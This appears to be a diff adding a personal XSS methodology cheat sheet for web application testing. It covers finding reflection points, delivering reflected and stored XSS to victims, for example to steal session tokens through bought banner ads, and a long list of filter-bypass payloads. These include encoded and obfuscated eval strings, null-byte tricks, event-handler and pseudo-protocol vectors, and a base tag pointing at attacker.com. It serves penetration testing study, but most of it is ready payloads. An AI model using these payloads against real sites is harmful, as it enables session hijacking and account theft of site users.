@@ -1,0 +1,165 @@
++---------------------------------------------------+
++-----------------Methodology of XSS----------------+
++---------------------------------------------------+
+
+i) Find all the parameters on a given page, and input a unique value in each parameter eg if there are 3 parameter: name=myname&browser=chrome&date=today enter values such as name=QQQQ&browser=WWWW&date=EEEE
+ii) Check where thsese are reflected in the response
+iii) for each value , identify the syntactic context eg is is being reflected in an input tag of script tag eg 
+<input type="text" value="QQQQ">
+iv) modify each input according to its context eg for above we would change the QQQQ to ">QQQQ to end the input tag to see if it is possible
+v) if it is being blocked or sanitized try the filter bypass payloads
+vi) enter a payload in place of the input to see if it is executed 
+
+
+
++-----------------Deliver Reflected XSS ------------------+
+
+i) If a web application has banner advertisements, try to buy a banner and then create a page that steals the session token as soon as the user clicks on the banner advertisement.
+
+ii) Create you own website that contains a script which will trigger a request to the victim web application resulting in an xss(stealing the session of victim web application of that user)
+An Attacker may  use  search  engine  manipulation techniques to generate visits from suitable users, such as by placing relevant keywords within the site content and linking to the site using relevant expressions
+
+iii) If a web application has “tell a friend” or send feedback to site administrators function which generates an e-mail with arbitrary content and recipients , the xss can be crafted in it.
+
+
++-----------------Deliver Stored XSS ------------------+
+
+i) Personal information fields — name, address, e-mail, telephone
+Names of documents, uploaded fi les, and other items
+Feedback or questions for application administrators
+Messages, status updates, comments, questions, and the like for other application users
+
+ii) Anything that is recorded in application logs and displayed in-browser to administrators, such as URLs, usernames, HTTP Referer, User-Agent, and the like
+
+iii) The contents of uploaded fi les that are shared between users
+
+iv) In a scenario where you can execute a stored xss in your own account eg name field, this will be  classified as a low-risk vulnerability, however look for other vulnerabilities on the web application that can be chained to the xss to create a more dangerous attack.eg a csrf that allowed only the change of the display name, this can then be used to chanfe the users name to an xss payload and steal the session token.
+
+v) test every instance in which the application processes the contents of an HTTP 
+request header,eg Referer and User-Agent headers are copied to message contents, an attacker can use a Flash object to trick a victim to issue a request containing these HTTP headers
+
+
+
++-----------------Bypassing common protection controls ------------------+
+
+i) Most web applications use blacklists to protect against XSS, eg block tags such as <script>, this can easily be bypassed by modifying it to 
+< sCrIpT >, or 
+%00“><script> or
+“><scr<script>ipt> or 
+<              SCRIPT               >
+or using a range of other tags to see which one is reflected as is in the response source code (use burp intruder to test each tag): view the file attatched named "html tags"
+Once you find the tag that is not blacklisted, check if events are blacklisted eg "Onload" may be blacklisted, again bruteforce different events to see which are not blacklisted, view file "html events"
+You can also use the file "XSS payloads huge", be careful as not to DOS the server with too many request, throttle the time for consecutive requests
+
+ii) instead of closing the previous tag try to stay in the same tag and introduce event handlers to execute payloads eg “ onfocus=”alert(1)
+
+iii) if alert() is blocked try others such as prompt(),confirm()
+
+iv) sometimes all 3 of the above are blocked, in that case try to directly perform an attack by making a request to burp collaborator and checking whether the request was successfully made. eg 
+<a href="https://burp collaborator" >test xss</a>
+
+v) To prevent any errors occuring because of you payload, end the tag as it should be ended then add // to comment rest of the line eg
+<script> var a=‘test’; var b = 123;</script> will change to
+<script> var a=‘test‘; alert(1);</script>//’; var b = 123;</script>
+
+vi) be sure to URL-encode any special characters that have significance within the url, including & = + ; and space
+
+vii) if your string is being inserted in a url , you can use javascript to trigger an xss eg javascript:alert(1);
+
+
+
++-----------------Beating Signature-Based Filters ------------------+
+
+Sometimes you will find that your payload are blocked and error messages such as "Dangerous characters detected" will be shown. We need to determine what part of the payload is trigerring this.
+
+i) if your payload : <script>alert(1)</script> is being blocked another form of it would be :
+<object data=”data:text/html,<script>alert(1)</script>”>
+<object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>
+<a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>
+test this xss</a>
+<object data="pic_trulli.jpg" Onload=alert(1) width="300" height="200"></object>
+<input autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus><input autofocus>
+<body onscroll=alert(1)><br><br>...<br><input autofocus>
+</a onmousemove=alert(1)>
+
+Script Pseudo-Protocols ------------------+
+Script pseudo-protocols can be used in various locations to execute inline script 
+within an attribute that expects a URL, eg 
+<object data=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<form id=test /><button form=test formaction=javascript:alert(1)>
+<event-source src=javascript:alert(1)>
+
+
+Bypassing Filters: HTML Based ------------------+
+
+i) Signature-based fi lters designed to block XSS attacks normally employ regular 
+expressions or other techniques to identify key HTML components
+We can bypass this by malforming the tags eg <img onerror=alert(1) src=a>, a detection mechanism may look for a payload after the "src" attribute which is bypassed.
+
+ii) use nullbyte at any position ( works on Internet Explorer):
+<[%00]img onerror=alert(1) src=a>
+<img o[%00]nerror=alert(1) src=a>
+<i[%00]mg onerror=alert(1) src=a>
+<img onerror=a[%00]lert(1) src=a>
+
+
+iii) introduce your own tags: 
+<x onclick=alert(1) src=a>test xss</x>
+
+iv) Using base tag to access hackers url
+The <base> tag is used to specify a URL that the browser should use to resolve any relative URLs that appear subsequently within the page.
+When the browser loads the scripts specified in the remainder of the HTML page, they are loaded from the server you specified
+
+<base href=”http://attacker.com/badscripts/”>
+...
+<script src=”badscripts.js”></script>
+
+iV) Combine different techniques
+
+<img onerror=a&#x6c;ert(1) src=a>
+<img onerror=a&#x06c;ert(1) src=a>
+<img onerror=a&#x006c;ert(1) src=a>
+<img onerror=a&#x0006c;ert(1) src=a>
+<img onerror=a&#108;ert(1) src=a>
+<img onerror=a&#0108;ert(1) src=a>
+<img onerror=a&#108ert(1) src=a>
+<img onerror=a&#0108ert(1) src=a>
+
+
+Bypassing Filters: Script Code ------------------+
+
+seek to block the use of 
+certain JavaScript keywords and other expressions. They may also block useful characters such as quotes, brackets, and dots
+
+JavaScript Escaping: 
+Unicode escapes can be used to represent characters within JavaScript 
+<script>a\u006cert(1);</script>
+<script>eval(‘a\u006cert(1)’);</script>
+<script>eval(‘a\x6cert(1)’);</script>
+<script>eval(‘a\154ert(1)’);</script>
+<script>eval(‘a\l\ert\(1\)’);</script>
+
+if eval doesnt work:
+<script>’alert(1)’.replace(/.+/,eval)</script>
+<script>function::[‘alert’](1)</script>
+
+
+Dynamically Constructing Strings:
+<script>eval(‘al’+’ert(1)’);</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
+<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
+
+Alternatives to Dots:
+if dots are blocked you can use : 
+<script>alert(document[‘cookie’])</script>
+<script>with(document)alert(cookie)</script>
+
+Combine multiple techniques:
+<img onerror=eval(‘al&#x5c;u0065rt(1)’) src=a>
+<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&
+#x29;&#x27;&#x29; src=a>
+
+466
